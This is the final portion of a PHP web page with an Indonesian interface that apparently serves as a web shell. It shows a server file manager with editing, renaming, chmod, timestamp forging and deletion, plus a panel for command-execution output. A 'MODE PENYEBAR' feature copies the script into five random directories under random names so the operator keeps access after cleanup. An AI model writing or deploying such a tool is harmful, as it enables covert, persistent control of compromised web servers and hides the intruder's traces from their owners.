                                        <span class="nama-kosmik nama-file">
                                            <?php echo $icon; ?> <?php echo $is_hidden ? '🔒' : ''; ?> <?php echo htmlspecialchars($i); ?>
                                            <?php echo $hidden_label; ?>
                                        </span>
                                    <?php endif; ?>
                                </td>
                                <td><?php echo $ukuran > 1024 ? round($ukuran/1024,2).' KB' : $ukuran.' B'; ?></td>
                                <td><?php echo $izin; ?></td>
                                <td><?php echo $diubah; ?></td>
                                <td>
                                    <a href="<?php echo $url_file; ?>" target="_blank" class="ikon-aksi open">🔗 OPEN</a>
                                    
                                    <?php if ($bisa_diedit): ?>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($i); ?>" class="ikon-aksi tombol-utama">Sunting</a>
                                    <?php endif; ?>
                                    
                                    <?php echo $tombolEkstrak; ?>
                                    
                                    <a href="#" onclick="tampilkanModalGantiNama('<?php echo htmlspecialchars(addslashes($i)); ?>')" class="ikon-aksi tombol-peringatan">Ganti Nama</a>
                                    <a href="#" onclick="tampilkanModalSentuh('<?php echo htmlspecialchars(addslashes($i)); ?>')" class="ikon-aksi tombol-kedua">Waktu</a>
                                    <a href="#" onclick="tampilkanModalChmod('<?php echo htmlspecialchars(addslashes($i)); ?>', '<?php echo $izin; ?>')" class="ikon-aksi tombol-kedua">Izin</a>
                                    <a href="?__d__=<?php echo urlencode($__dir__); ?>&__hapus__=<?php echo urlencode($i); ?>" 
                                       class="ikon-aksi tombol-bahaya" onclick="return confirm('Hapus file ini?')">Hapus</a>
                                </td>
                            </tr>
                            <?php
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
        
        <?php if (isset($file_diedit)): ?>
        <div class="penyunting-kosmik">
            <h3>✏️ Menyunting: <?php echo htmlspecialchars($file_diedit); ?></h3>
            <form method="post">
                <textarea name="__konten__" class="input-kosmik" spellcheck="false"><?php echo htmlspecialchars($konten_file); ?></textarea>
                <input type="hidden" name="__edit_file__" value="<?php echo htmlspecialchars($file_diedit); ?>">
                <div style="margin-top: 20px;">
                    <button type="submit" class="tombol-kosmik tombol-sukses">💾 Simpan Perubahan</button>
                    <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="tombol-kosmik tombol-kedua">Batal</a>
                </div>
            </form>
        </div>
        <?php endif; ?>
        
        <?php if (!empty($keluaran_perintah) && trim($keluaran_perintah) !== ''): ?>
        <div class="terminal-kosmik">
            <h3>📟 Hasil Perintah</h3>
            <?php
            $apakah_sukses = strpos($keluaran_perintah, '✅ Berhasil:') === 0 || strpos($keluaran_perintah, '✅ Berhasil:') !== false;
            ?>
            <div class="status-perintah <?php echo $apakah_sukses ? 'status-sukses' : 'status-error'; ?>">
                <?php echo $apakah_sukses ? '✓ PERINTAH BERHASIL' : '✗ PERINTAH GAGAL'; ?>
            </div>
            <div class="keluaran-terminal">
                <?php 
                $baris = explode("\n", $keluaran_perintah);
                foreach ($baris as $i => $b) {
                    $b = htmlspecialchars($b);
                    
                    if ($i === 0) {
                        echo '<div style="color: ' . ($apakah_sukses ? '#00b09b' : '#ff416c') . '; font-weight: bold; margin-bottom: 10px; font-family: \'Orbitron\', monospace;">' . $b . '</div>';
                    } elseif (preg_match('/^\s*\[STDERR\]:/i', $b)) {
                        echo '<div style="color: #ff416c;">' . $b . '</div>';
                    } elseif (preg_match('/^\s*\[KODE KELUAR\]:/i', $b)) {
                        echo '<div style="color: #ff8008;">' . $b . '</div>';
                    } elseif (preg_match('/^\s*\d+\.\d+%|\s*\d+%|\s*\d+\/\d+/', $b)) {
                        echo '<div style="color: #00d2ff;">' . $b . '</div>';
                    } elseif (preg_match('/^\s*(http|https|ftp):\/\//i', $b)) {
                        echo '<div style="color: #8e2de2;">' . $b . '</div>';
                    } else {
                        echo '<div>' . $b . '</div>';
                    }
                }
                ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
    
    <!-- MODAL (tetap sama seperti sebelumnya) -->
    <div class="modal-kosmik" id="modalBuat">
        <div class="konten-modal">
            <h3>➕ Buat Objek Baru</h3>
            <form method="post">
                <input type="text" name="__nama__" class="input-kosmik" placeholder="Nama (contoh: .htaccess untuk hidden)" required>
                <select name="__tipe__" class="input-kosmik">
                    <option value="file">📄 File</option>
                    <option value="folder">📁 Folder</option>
                </select>
                <textarea name="__data__" class="input-kosmik" placeholder="Konten (untuk file)" rows="4"></textarea>
                <input type="hidden" name="__buat__" value="1">
                <div class="tombol-aksi" style="margin-top: 25px;">
                    <button type="submit" class="tombol-kosmik tombol-sukses">Buat</button>
                    <button type="button" class="tombol-kosmik tombol-kedua" onclick="sembunyikanModal('modalBuat')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal-kosmik" id="modalChmod">
        <div class="konten-modal">
            <h3>🔧 Izin</h3>
            <form method="post">
                <input type="hidden" name="__chmod_file__" id="namaFileChmod">
                <input type="text" name="__izin__" id="nilaiChmod" class="input-kosmik" placeholder="misalnya, 0755" pattern="[0-7]{4}" required>
                <small style="color: #a0a0ff;">Umum: 0755 (rwxr-xr-x), 0644 (rw-r--r--), 0777 (rwxrwxrwx)</small>
                <div class="tombol-aksi" style="margin-top: 25px;">
                    <button type="submit" name="__chmod__" value="1" class="tombol-kosmik tombol-sukses">Terapkan</button>
                    <button type="button" class="tombol-kosmik tombol-kedua" onclick="sembunyikanModal('modalChmod')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal-kosmik" id="modalSentuh">
        <div class="konten-modal">
            <h3>📅 Ubah Waktu</h3>
            <form method="post">
                <input type="hidden" name="__sentuh_file__" id="namaFileSentuh">
                <input type="datetime-local" name="__stempel_waktu__" id="nilaiSentuh" class="input-kosmik" required>
                <small style="color: #a0a0ff;">Atur waktu modifikasi file/folder</small>
                <div class="tombol-aksi" style="margin-top: 25px;">
                    <button type="submit" name="__sentuh__" value="1" class="tombol-kosmik tombol-sukses">Ubah</button>
                    <button type="button" class="tombol-kosmik tombol-kedua" onclick="sembunyikanModal('modalSentuh')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal-kosmik" id="modalGantiNama">
        <div class="konten-modal">
            <h3>✏️ Ganti Nama</h3>
            <form method="post">
                <input type="hidden" name="__ganti_nama_lama__" id="namaLamaGanti">
                <input type="text" name="__ganti_nama_baru__" id="namaBaruGanti" class="input-kosmik" placeholder="Nama baru" required>
                <div class="tombol-aksi" style="margin-top: 25px;">
                    <button type="submit" name="__ganti_nama__" value="1" class="tombol-kosmik tombol-sukses">Ganti</button>
                    <button type="button" class="tombol-kosmik tombol-kedua" onclick="sembunyikanModal('modalGantiNama')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal-kosmik" id="modalHapus">
        <div class="konten-modal">
            <h3>🗑 Hapus Terpilih</h3>
            <p style="color: #ff416c; margin: 20px 0;">⚠️ Peringatan: Ini akan menghapus item terpilih secara permanen!</p>
            <form method="post" id="formHapusTerpilih">
                <div id="containerItemTerpilih"></div>
                <div class="tombol-aksi">
                    <button type="submit" name="__hapus_terpilih__" value="1" class="tombol-kosmik tombol-bahaya">Hapus</button>
                    <button type="button" class="tombol-kosmik tombol-kedua" onclick="sembunyikanModal('modalHapus')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal-kosmik" id="modalSebar">
        <div class="konten-modal">
            <h3>🌱 MODE PENYEBAR</h3>
            <p style="margin: 20px 0; color: #00ff00;">
                ⚡ Akan menyebarkan script ke <strong>5 DIREKTORI</strong> berbeda
            </p>
            <p style="color: #a0a0ff; margin-bottom: 20px;">
                File akan digandakan ke folder acak dengan nama acak.<br>
                <span style="color: #ffff00;">Setelah selesai, Anda akan melihat 5 LINK</span>
            </p>
            <div class="peringatan-hilang">
                ⚠️ SIMPAN LINK-LINK TERSEBUT ⚠️
            </div>
            <div class="tombol-aksi" style="margin-top: 25px;">
                <form method="post" style="width: 100%;">
                    <input type="hidden" name="__aksi_sebar__" value="sebarkan">
                    <button type="submit" class="tombol-kosmik tombol-sukses" style="width: 100%; padding: 20px; font-size: 18px;">
                        🌱 SEBARKAN
                    </button>
                </form>
                <button type="button" class="tombol-kosmik tombol-kedua" onclick="sembunyikanModal('modalSebar')" style="width: 100%; margin-top: 10px;">
                    Batal
                </button>
            </div>
        </div>
    </div>
    
    <script>
        // Hasilkan bintang dinamis
        const kontainerBintang = document.getElementById('bintangDinamis');
        for (let i = 0; i < 150; i++) {
            const bintang = document.createElement('div');
            bintang.className = 'partikel-bintang';
            bintang.style.width = Math.random() * 3 + 1 + 'px';
            bintang.style.height = bintang.style.width;
            bintang.style.left = Math.random() * 100 + '%';
            bintang.style.top = Math.random() * 100 + '%';
            bintang.style.opacity = Math.random() * 0.5 + 0.1;
            bintang.style.animationDuration = Math.random() * 4 + 2 + 's';
            bintang.style.animationDelay = Math.random() * 5 + 's';
            kontainerBintang.appendChild(bintang);
        }
        
        // Hasilkan partikel kuantum
        for (let i = 0; i < 20; i++) {
            const partikel = document.createElement('div');
            partikel.className = 'partikel-kuantum';
            partikel.style.setProperty('--tx', Math.random() * 2 - 1);
            partikel.style.setProperty('--ty', Math.random() * 2 - 1);
            partikel.style.left = Math.random() * 100 + '%';
            partikel.style.top = Math.random() * 100 + '%';
            partikel.style.animationDelay = Math.random() * 20 + 's';
            partikel.style.animationDuration = Math.random() * 30 + 10 + 's';
            document.body.appendChild(partikel);
        }
        
        // Fungsi modal
        function tampilkanModal(id) {
            const modal = document.getElementById(id);
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
        
        function sembunyikanModal(id) {
            document.getElementById(id).style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        function tampilkanModalBuat() {
            tampilkanModal('modalBuat');
            document.querySelector('#modalBuat input[name="__nama__"]').focus();
        }
        
        function tampilkanModalHapus() {
            const dicentang = document.querySelectorAll('input[name="item_terpilih[]"]:checked');
            if (dicentang.length === 0) {
                alert('Silakan pilih item untuk dihapus');
                return;
            }
            
            const container = document.getElementById('containerItemTerpilih');
            container.innerHTML = '';
            
            dicentang.forEach(item => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'item_terpilih[]';
                input.value = item.value;
                container.appendChild(input);
            });
            
            tampilkanModal('modalHapus');
        }
        
        function tampilkanModalSebar() {
            tampilkanModal('modalSebar');
        }
        
        function tampilkanModalChmod(namaFile, izinSaatIni) {
            document.getElementById('namaFileChmod').value = namaFile;
            document.getElementById('nilaiChmod').value = izinSaatIni;
            tampilkanModal('modalChmod');
            document.getElementById('nilaiChmod').focus();
        }
        
        function tampilkanModalSentuh(namaFile) {
            document.getElementById('namaFileSentuh').value = namaFile;
            const sekarang = new Date();
            document.getElementById('nilaiSentuh').value = sekarang.toISOString().slice(0,16);
            tampilkanModal('modalSentuh');
        }
        
        function tampilkanModalGantiNama(namaFile) {
            document.getElementById('namaLamaGanti').value = namaFile;
            document.getElementById('namaBaruGanti').value = namaFile;
            tampilkanModal('modalGantiNama');
            document.getElementById('namaBaruGanti').focus();
            document.getElementById('namaBaruGanti').select();
        }
        
        // Pilih semua
        document.getElementById('pilihSemua')?.addEventListener('change', function(e) {
            const kotakCentang = document.querySelectorAll('input[name="item_terpilih[]"]');
            kotakCentang.forEach(kb => kb.checked = e.target.checked);
        });
        
        // Pintasan keyboard
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                sembunyikanModal('modalBuat');
                sembunyikanModal('modalChmod');
                sembunyikanModal('modalSentuh');
                sembunyikanModal('modalGantiNama');
                sembunyikanModal('modalHapus');
                sembunyikanModal('modalSebar');
            }
            
            if (e.ctrlKey && e.key === 'Enter' && document.getElementById('inputTerminal')) {
                document.querySelector('form').submit();
            }
        });
        
        // Klik di luar untuk menutup modal
        document.querySelectorAll('.modal-kosmik').forEach(modal => {
            modal.addEventListener('click', function(e) {
                if (e.target === this) sembunyikanModal(this.id);
            });
        });
        
        // Fokus otomatis pada input terminal
        document.getElementById('inputTerminal')?.focus();
        
        // Klik dua kali untuk membuka folder/file
        document.querySelectorAll('.nama-kosmik.nama-folder').forEach(tautan => {
            tautan.addEventListener('dblclick', function(e) {
                window.location.href = this.href;
            });
        });
        
        document.querySelectorAll('.nama-kosmik.nama-file').forEach(tautan => {
            if (tautan.href) {
                tautan.addEventListener('dblclick', function(e) {
                    window.location.href = this.href;
                });
            }
        });
        
        // Auto-hide pesan setelah 5 detik
        setTimeout(function() {
            const pesanDiv = document.querySelector('.pesan');
            if (pesanDiv) {
                pesanDiv.style.display = 'none';
            }
        }, 5000);
        
        // Jika ada hasil sebar, scroll ke atas
        <?php if ($tampilkan_hasil_sebar): ?>
        window.scrollTo(0, 0);
        <?php endif; ?>
        
        // Latar belakang interaktif saat mouse bergerak
        document.addEventListener('mousemove', function(e) {
            const x = e.clientX / window.innerWidth;
            const y = e.clientY / window.innerHeight;
            
            document.querySelector('.latar-utama').style.background = `
                radial-gradient(circle at ${x * 100}% ${y * 100}%, rgba(74, 0, 224, 0.4) 0%, transparent 40%),
                radial-gradient(circle at ${100 - x * 100}% ${100 - y * 100}%, rgba(0, 210, 255, 0.3) 0%, transparent 40%),
                radial-gradient(circle at 50% 50%, rgba(255, 0, 255, 0.2) 0%, transparent 50%),
                linear-gradient(135deg, #000000 0%, #0a0a2a 50%, #1a0033 100%)
            `;
        });
    </script>
</body>
</html>
